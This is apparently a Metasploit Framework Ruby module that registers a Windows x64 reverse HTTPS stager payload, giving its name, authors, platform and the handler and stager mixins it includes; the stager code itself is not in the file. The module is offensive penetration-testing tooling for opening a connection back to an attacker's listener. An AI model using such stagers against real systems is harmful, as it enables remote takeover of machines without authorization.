##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_https'
require 'msf/core/payload/windows/x64/reverse_https'

module MetasploitModule

  CachedSize = 562

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttps_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows x64 Reverse HTTP Stager (wininet)',
      'Description' => 'Tunnel communication over HTTP (Windows x64 wininet)',
      'Author'      => [ 'hdm', 'agix', 'rwincey' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'sockrdi https',
      'Stager'      => { 'Payload' => '' }))
  end
end
